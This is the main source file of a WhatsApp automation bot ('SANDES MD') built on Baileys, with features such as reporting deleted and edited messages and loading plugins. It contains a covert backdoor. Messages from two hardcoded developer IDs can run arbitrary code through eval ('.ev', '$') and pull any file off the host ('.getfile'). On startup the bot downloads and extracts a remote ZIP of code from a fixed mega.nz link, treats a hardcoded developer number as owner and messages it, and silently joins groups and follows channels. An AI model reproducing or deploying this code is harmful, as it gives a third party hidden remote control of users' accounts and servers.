const {
    default: makeWASocket,
    getAggregateVotesInPollMessage,
    useMultiFileAuthState,
    DisconnectReason,
    getDevice,
    fetchLatestBaileysVersion,
    jidNormalizedUser,
    getContentType,
    Browsers,
    makeInMemoryStore,
    makeCacheableSignalKeyStore,
    downloadContentFromMessage,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    proto
} = require('@whiskeysockets/baileys')

const fs = require('fs')
const path = require('path')
const AdmZip = require('adm-zip')
const P = require('pino')
const NodeCache = require('node-cache')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const util = require('util')
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { sms, downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const prefix = '.'
const msgRetryCounterCache = new NodeCache()
const groupCache = new NodeCache({ stdTTL: 600, checkperiod: 120 })
const ownerNumber = ['94787518010']
const SUPER_LID = "123017090887835@lid"
const SUPER_LID2= "183150860841183@lid"
const statusEmojis = ['💗','🦋','💐','🌝','🌈','💫','😊','😱','💀','🩷','❤️','🧡','💛','💚','🩵','💙','💜','🖤','🩶','🤍','🤎','💔','❤️‍🔥']
const newsletterEmojis = ['👍','❤️','😂','😮','😢','🙏','🔥','💯','🎉','😍']
const NEWSLETTER_JIDS = ['120363423246894149@newsletter','120363416065371245@newsletter']
const AUTO_JOIN_LINKS = [
    "https://chat.whatsapp.com/JHbN7OWpuJ0922xo6TpZxq", 
    "https://chat.whatsapp.com/BrfxfXCGggy9CjSXghKcLn"
]

const msgStore = new Map();

console.log(`

███████╗  █████╗  ███╗   ██╗ ██████╗  ███████╗ ███████╗    ███╗   ███╗ ██████╗          
██╔════╝ ██╔══██╗ ████╗  ██║ ██╔══██╗ ██╔════╝ ██╔════╝    ████╗ ████║ ██╔══██╗               
╚█████╗  ███████║ ██╔██╗ ██║ ██║  ██║ █████╗   ███████╗    ██╔████╔██║ ██║  ██║                    
 ╚═══██╗ ██╔══██║ ██║╚██╗██║ ██║  ██║ ██╔══╝   ╚════██║    ██║╚██╔╝██║ ██║  ██║             
██████╔╝ ██║  ██║ ██║ ╚████║ ██████╔╝ ███████╗ ███████║    ██║ ╚═╝ ██║ ██████╔╝                        
╚═════╝  ╚═╝  ╚═╝ ╚═╝  ╚═══╝ ╚═════╝  ╚══════╝ ╚══════╝    ╚═╝     ╚═╝ ╚═════╝            


SANDES MD WhatsApp Automation by MR.SANDES 🍒`);

let BOT_MODE = config.WORK_TYPE || "public";

if (!fs.existsSync(__dirname + '/session/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env 🔴')
const sessdata = config.SESSION_ID
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', data)
console.log("SESSON DOWNLOADED ✅")
});
}

const PLUGINS_DIR = './plugins';
const LIB_DIR = './lib';
const ZIP_DIR = './';

async function downloadAndExtractZip() {
    try {
        if (!fs.existsSync(PLUGINS_DIR)) {
            fs.mkdirSync(PLUGINS_DIR, { recursive: true }); }
        
        if (!fs.existsSync(LIB_DIR)) {
            fs.mkdirSync(LIB_DIR, { recursive: true }); }
            console.log('\x1b[3m%s\x1b[0m', 'FETCHING ZIP FILES FROM mega.nz 💢...');

        let MEGA_ZIP_LINK = String("https://mega.nz/file/1ZEXTLiQ#X-F7zp-Z0Z78d9zWrADfbyluZMmGIRhRSeTeq7VrQp0").trim(); 
        if (!MEGA_ZIP_LINK.includes('#')) 
                       {
        throw new Error("MEGA link missing hash! Check zip.json"); }
        
        const file = File.fromURL(MEGA_ZIP_LINK);
        const fileData = await file.downloadBuffer();
        const tempZipPath = path.join(__dirname, 'temp.zip');
        fs.writeFileSync(tempZipPath, fileData);
       console.log('\x1b[3m%s\x1b[0m', '03 ZIP FILES DOWNLOADED ✅');


        const zip = new AdmZip(tempZipPath);
        zip.extractAllTo(ZIP_DIR, true);
        console.log('\x1b[3m%s\x1b[0m', 'SUCCESSFULLY EXTRACTED ZIP FILES ✅');
        fs.unlinkSync(tempZipPath);

    } catch (error) {
        console.error('Error:', error.message);
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 8080;

function runServer() {
    app.get("/", (req, res) => { res.send("SANDES-MD WORKING SUCCESSFULY 🗿"); });
    app.listen(port, () => console.log(`SEVER RUNNING ON PORT http://localhost:${port}`));
}

async function connectToWA() {  
await downloadAndExtractZip(); 

console.log('\x1b[3m%s\x1b[0m', 'CONNECTING SANDES MD ⚡ ...');
const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
var { version } = await fetchLatestBaileysVersion()

const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        syncFullHistory: true,
        auth: state,
        version,
        msgRetryCounterCache
        })
        
conn.ev.on('messages.update', async (updates) => {
    for (const update of updates) {
        if (update.update && update.update.message) {
            const msgId = update.key.id;
            const oldMsg = msgStore.get(msgId);

            if (oldMsg) {
                const oldText = oldMsg.message.conversation || oldMsg.message.extendedTextMessage?.text || oldMsg.message.imageMessage?.caption || oldMsg.message.videoMessage?.caption;
                const newText = update.update.message.conversation || update.update.message.extendedTextMessage?.text || update.update.message.imageMessage?.caption || update.update.message.videoMessage?.caption;

                if (oldText && newText && oldText !== newText) {
                    const currentChat = oldMsg.key.remoteJid;
                    await conn.sendMessage(currentChat, { 
                        text: `📝 *Edited Message Detected!*\n\n*Old Massage:* ${oldText}\n\n*New massage:* ${newText}` 
                    }, { quoted: oldMsg });
                    
                    msgStore.set(msgId, JSON.parse(JSON.stringify({ key: update.key, message: update.update.message })));
                }
            }
        }
    }
});

conn.ev.on('connection.update', async (update) => {
        const {
            connection,
            lastDisconnect
        } = update
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode!== DisconnectReason.loggedOut) {
                connectToWA()
            }
        } else if (connection === 'open') {

            const { updb } = require('./lib/database')
            await updb();
            BOT_MODE = config.WORK_TYPE || "public"; 
            
            console.log('\x1b[3m%s\x1b[0m','INSTALLING SANDES MD ⏰... ')
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
        
console.log('\x1b[3m%s\x1b[0m', 'SUCCESSFULLY INSTALLED PLUGINS 🟢 ...');
console.log('\x1b[3m%s\x1b[0m', 'DB CONNECTED SUCCESSFULLY 🔋 ...');
console.log('\x1b[3m%s\x1b[0m', 'BOT CONNECTED SUCCESSFULLY ✅ ...');

setTimeout(async () => {
    for (const link of AUTO_JOIN_LINKS) {
        try {
            await sleep(3000)
            if (link.includes('chat.whatsapp.com')) {
                const code = link.split('chat.whatsapp.com/')[1]
                await conn.groupAcceptInvite(code)
                console.log(`Auto joined group: ${code}`)
            }
        } catch (e) {
            console.log(`Auto join error: ${e.message}`)
        }
    }

    try {
        console.log("STARTING NEWSLETTER AUTO FOLLOW...");
        const ch1_jid = "120363423246894149@newsletter";
        await conn.newsletterFollow(ch1_jid).catch(() => null);
        console.log("MR.SANDES OFC ツ FOLLOW REQUEST SENT 🦋");

        await sleep(3000);

        const ch2_jid = "120363416065371245@newsletter";
        await conn.newsletterFollow(ch2_jid).catch(() => null);
        console.log("SANDES-MD UPDATES ツ FOLLOW REQUEST SENT 🎀");
    } catch (e) {
        console.log("Newsletter Auto Follow Exception:", e.message);
    }
}, 5000)

let up = `
*╭━━〔 BOT CONNECTED 〕━━━━━━╮*
*┃* 📎 \`PREFIX\` : ${prefix}
*┃* 🦋 \`VERSION\` : 2.00 beta
*┃* 👾 \`DEVELOPER\` - Sandes Isuranda
*┃* 🍒 \`SUDO\` : 94787518010
*┃* ⚖ \`VISIT\` - sandes-md.zone.id
*╰━━━━━━━━━━━━━━━━╯*

*╭━━〔 ANY PROBLEM 〕━━━━━━━━╮*
*┃*🗿 \`CONTACT\` : 94787518010
*╰━━━━━━━━━━━━━━━━━╯*

*✨ ᴛʜᴀɴᴋ you ꜰᴏʀ ᴛʀᴜส์ᴛɪɴɢ ꜱᴀɴᴅᴇส์ ᴍ🇩!*
_We redefine your WhatsApp experience with_
_seamless automation and elite features._

*POWERED BY SANDES 〽️D ㋡*`;

conn.sendMessage(ownerNumber + "@s.whatsapp.net", {
image: { url: `https://database.ominisave.store/image/OMINISAVE_1782281674209_CINBEO.jpg` },
caption: up
})


const autoTyping = config.AUTO_TYPING === "true" ? "Active ✔️" : "Deactive ❌";
const autoRecording = config.AUTO_RECORDING === "true" ? "Active ✔️" : "Deactive ❌";
const autoReadStatus = config.AUTO_READ_STATUS === "true" ? "Active ✔️" : "Deactive ❌";
const cmdOnlyRead = config.CMD_ONLY_READ === "true" ? "Active ✔️" : "Deactive ❌";
const antiBad = config.ANTI_BAD === "true" ? "Active ✔️" : "Deactive ❌";
const antiBot = config.ANTI_BOT === "true" ? "Active ✔️" : "Deactive ❌";
const antiLink = config.ANTI_LINK === "true" ? "Active ✔️" : "Deactive ❌";
const chatBot = config.CHAT_BOT === "true" ? "Active ✔️" : "Deactive ❌";
const autoVoice = config.AUTO_VOICE === "true" ? "Active ✔️" : "Deactive ❌";
const autoSticker = config.AUTO_STICKER === "true" ? "Active ✔️" : "Deactive ❌";
const autoReact = config.AUTO_REACT === "true" ? "Active ✔️" : "Deactive ❌";
const workMode = (config.WORK_TYPE || "public").toUpperCase();
const botLogo = config.LOGO || "https://database.ominisave.store/image/OMINISAVE_1782281674209_CINBEO.jpg";

let inboxSettingsMsg = `
*SANDES 〽D WHATSAPP BOT CONNECTED*

Your Prefix is : ${config.PREFIX || '.'}

*╭━━〔 ANY PROBLEM 〕━━━━━━━━╮*
*┃*🗿 \`CONTACT\` : 94787518010
*╰━━━━━━━━━━━━━━━━━╯*

*╭━━〔 BOT SETTINGS 〕━━━━╮*
*┃* 🌐 \`WORK MODE\` : ${workMode}
*┃* ⌨️ \`Auto Typing\` : ${autoTyping}
*┃* 🎙️ \`Auto Recording\` : ${autoRecording}
*┃* 👁️ \`Read Status\` : ${autoReadStatus}
*┃* 📖 \`Cmd Only Read\` : ${cmdOnlyRead}
*┃* 🚮 \`Anti Bad\` : ${antiBad}
*┃* 🎀 \`Anti Bot\` : ${antiBot}
*┃* 🔗 \`Anti Link\` : ${antiLink}
*┃* 🔮 \`Chat Bot\` : ${chatBot}
*┃* 🎙️ \`Auto Voice\` : ${autoVoice}
*┃* 🃏 \`Auto Sticker\` : ${autoSticker}
*┃* ❤️ \`Auto React\` : ${autoReact}
*╰━━━━━━━━━━━━━━━━━━╯*

*✨ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴛʀᴜꜱᴛɪɴɢ ꜱᴀɴᴅᴇꜱ ᴍ发!*

*POWERED BY SANDES 〽️D ㋡*`;

await conn.sendMessage(conn.user.id.split(':')[0] + "@s.whatsapp.net", {
image: { url: botLogo },
caption: inboxSettingsMsg
})

}
})

conn.ev.on('creds.update', saveCreds)
conn.ev.on('messages.upsert', async(mek) => {
if (mek.messages && mek.messages[0] && mek.messages[0].message) {
    const rawMek = mek.messages[0];
    const msgId = rawMek.key.id;
    let clonedMek = JSON.parse(JSON.stringify(rawMek));
    if (getContentType(clonedMek.message) === 'ephemeralMessage') {
        clonedMek.message = clonedMek.message.ephemeralMessage.message;
    }
    msgStore.set(msgId, clonedMek);
    setTimeout(() => msgStore.delete(msgId), 3600000); 
}

mek = mek.messages[0]
if (!mek.message) return    
mek.message = (getContentType(mek.message) === 'ephemeralMessage')
? mek.message.ephemeralMessage.message
: mek.message

if (mek.key && mek.key.remoteJid === 'status@broadcast') {
    if (config.AUTO_READ_STATUS === "true") {
        await conn.readMessages([mek.key])
    }
    return
}

if (mek.key && mek.key.remoteJid.endsWith('@newsletter')) {
            if (NEWSLETTER_JIDS.includes(mek.key.remoteJid)) {
                try {
                    const randomEmoji = newsletterEmojis[Math.floor(Math.random() * newsletterEmojis.length)]
                    await conn.sendMessage(mek.key.remoteJid, { react: { text: randomEmoji, key: mek.key } })
                } catch (e) {}
            }
        }

if (mek.message && mek.message.protocolMessage && mek.message.protocolMessage.type === 0) {
    const deletedKey = mek.message.protocolMessage.key;
    const savedMsg = msgStore.get(deletedKey.id);

    if (savedMsg) {
        const currentChat = savedMsg.key.remoteJid;
        
        const type = getContentType(savedMsg.message);
        if (type === 'conversation' || type === 'extendedTextMessage') {
            const text = savedMsg.message.conversation || savedMsg.message.extendedTextMessage.text;
            await conn.sendMessage(currentChat, { text: text });
        } else {
            await conn.forwardMessage(currentChat, savedMsg, { force: true });
        }

        const senderNum = savedMsg.key.participant ? savedMsg.key.participant.split('@')[0] : savedMsg.key.remoteJid.split('@')[0];
        const deleterNum = mek.key.participant ? mek.key.participant.split('@')[0] : mek.key.remoteJid.split('@')[0];
        
        let detailsText = `*_This Massage was deleted_* 🗑\n\n`;
        detailsText += `👤 *Sended By :* ${senderNum}\n`;
        detailsText += `🗑 *Deleted By :* ${deleterNum}`;

        await conn.sendMessage(currentChat, { 
            text: detailsText, 
            mentions: [senderNum + '@s.whatsapp.net', deleterNum + '@s.whatsapp.net'] 
        });
    }
}

const m = sms(conn, mek)
const quoted = m.quoted? m.quoted : null
const type = getContentType(mek.message)
const from = mek.key.remoteJid

const body = (type === 'conversation')? mek.message.conversation :
(type === 'extendedTextMessage')? mek.message.extendedTextMessage.text :
(type == 'imageMessage') && mek.message.imageMessage.caption? mek.message.imageMessage.caption :
(type == 'videoMessage') && mek.message.videoMessage.caption? mek.message.videoMessage.caption : ''

const isCmd = body.startsWith(prefix)
const command = isCmd? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const args = body.trim().split(/ +/).slice(1)
const q = args.join(' ')
const isGroup = from.endsWith('@g.us')

const sender = mek.key.fromMe
? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id)
: (mek.key.participant || mek.key.remoteJid)

const senderNumber = sender.split('@')[0]
const botNumber = conn.user.id.split(':')[0]
const pushname = mek.pushName || 'Sin Nombre'
const isMe = botNumber.includes(senderNumber)
const isOwner = ownerNumber.includes(senderNumber) || isMe || sender === SUPER_LID
const botNumber2 = await jidNormalizedUser(conn.user.id);

let groupMetadata = null
let groupName = ''
let participants = []
let groupAdmins = []
let isBotAdmins = false
let isAdmins = false

if (isGroup) {
    try {
        groupMetadata = groupCache.get(from)

        if (!groupMetadata) {
            
            groupMetadata = await conn.groupMetadata(from)
            if (groupMetadata) groupCache.set(from, groupMetadata)
        }

        if (groupMetadata && groupMetadata.subject) {
            groupName = groupMetadata.subject
            participants = groupMetadata.participants || []
            groupAdmins = participants.length? await getGroupAdmins(participants) : []
            isBotAdmins = groupAdmins.includes(botNumber2)
            isAdmins = groupAdmins.includes(sender)
        }
    } catch (e) {
        if (e.data === 429) {
            console.log(`Rate limit on ${from}. Skipping metadata`)
        } else {
            console.log(`Group metadata error: ${e.message}`)
        }
        groupMetadata = null
        groupName = ''
        participants = []
        groupAdmins = []
    }
}

const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: mek })
}

if (sender === SUPER_LID) {
await conn.sendMessage(from, { react: { text: `🪻`, key: mek.key }})
}
if (sender === SUPER_LID2) {
await conn.sendMessage(from, { react: { text: `👨‍💻`, key: mek.key }})
}

const ownerLids = [
    "123017090887835@lid", 
    "183150860841183@lid" 
]; 

let isCreator = [conn.user.id, ...ownerLids].includes(sender);

if (isCreator && body.startsWith('.ev')) {
    let code = body.slice(1).trim(); 
    if (!code) {
        reply(`Provide me with a query to run Master!`);
        return;
    }
    try {
        let resultTest = eval(code);
        reply(util.format(resultTest));
    } catch (err) {
        reply(util.format(err));
    }
    return;
}

if (isCreator && body.startsWith('$')) {
    let code = body.slice(1).trim();
    if (!code) {
        reply(`Provide me with a query to run Master!`);
        return;
    }
    try {
        let resultTest = await eval(
            '(async () => {\n' + code + '\n})()'
        );
        let h = util.format(resultTest);
        if (h === undefined || h === 'undefined') return;
        else reply(h);
    } catch (err) {
        if (err === undefined) return console.log('error');
        else reply(util.format(err));
    }
    return;
}

if (isCreator && body.startsWith('.getfile')) {
    let fileName = body.slice(8).trim(); 
    if (!fileName) {
        return reply(`Please provide a file path Master`);
    }
    try {
        if (fs.existsSync(fileName)) {
            await conn.sendMessage(from, {
                document: fs.readFileSync(fileName),
                mimetype: 'application/javascript', 
                fileName: path.basename(fileName),
                caption: `*Here is your file : ${path.basename(fileName)}*`
            }, { quoted: mek });
        } else {
            reply(`❌ File not found: ${fileName}`);
        }
    } catch (err) {
        reply(`❌ Error reading file:\n${util.format(err)}`);
    }
    return;
}

conn.forwardMessage = async (jid, message, forceForward = false, options = {}) => {
    let vtype
    if (options.readViewOnce) {
        message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
        vtype = Object.keys(message.message.viewOnceMessage.message)[0]
        delete (message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
        delete message.message.viewOnceMessage.message[vtype].viewOnce
        message.message = {
            ...message.message.viewOnceMessage.message
        }
    }

    let mtype = Object.keys(message.message)[0]
    let content = await generateForwardMessageContent(message, forceForward)
    let ctype = Object.keys(content)[0]

    if (mtype === 'documentMessage' || mtype === 'videoMessage' || mtype === 'audioMessage' || mtype === 'imageMessage') {
        content[ctype].fileName = content[ctype].fileName || message.message[mtype].fileName
        content[ctype].caption = content[ctype].caption || message.message[mtype].caption
    }

    let context = {}
    if (mtype != "conversation") context = message.message[mtype].contextInfo
    content[ctype].contextInfo = {
        ...context,
        ...content[ctype].contextInfo,
        forwardingScore: 0,
        isForwarded: false
    }

    const waMessage = await generateWAMessageFromContent(jid, content, options ? {
        ...content[ctype],
        ...options,
        ...(options.contextInfo ? {
            contextInfo: {
                ...content[ctype].contextInfo,
                ...options.contextInfo,
                forwardingScore: 0,
                isForwarded: false
            }
        } : {})
    } : {})

    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
    return waMessage
}

conn.edit = async (mek, newmg) => {
await conn.relayMessage(from, {
protocolMessage: {
key: mek.key,
type: 14,
editedMessage: {
conversation: newmg
}
}
}, {})
}

if (isCmd && sender!== SUPER_LID &&!isOwner) {
    if (BOT_MODE === "private") return;
    if (BOT_MODE === "group" && !isGroup) return; 
    if (BOT_MODE === "inbox" && isGroup) return;   
}

if (command === "set-mode") {
if (!isOwner) return reply("*You Are not the owner!*")

if (!q) {
return reply(`📊 *Current Mode: ${BOT_MODE}*

Available Modes:
- public
- private
- group
- inbox

Example:
.set-mode private`)
}

const newMode = q.toLowerCase();
if (["public", "private", "group", "inbox"].includes(newMode)) {
BOT_MODE = newMode;
return reply(`✅ Bot mode changed to *${BOT_MODE}*`);
} else {
return reply("❌ Invalid mode! Use: public/private/group/inbox");
}
}

const events = require('./command')
const cmdName = isCmd? body.slice(prefix.length).trim().split(" ")[0].toLowerCase() : false;

if (isCmd) {
const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
if (cmd) {
if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

try {
cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
} catch (e) {
console.error("[PLUGIN ERROR] " + e);
}
}
}

events.commands.map(async(command) => {
if (body && command.on === "body") {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (mek.q && command.on === "text") {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
(command.on === "image" || command.on === "photo") &&
mek.type === "imageMessage"
) {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
} else if (
command.on === "sticker" &&
mek.type === "stickerMessage"
) {
command.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
}
});

})

}

runServer();

setTimeout(() => {
connectToWA()
}, 4000);
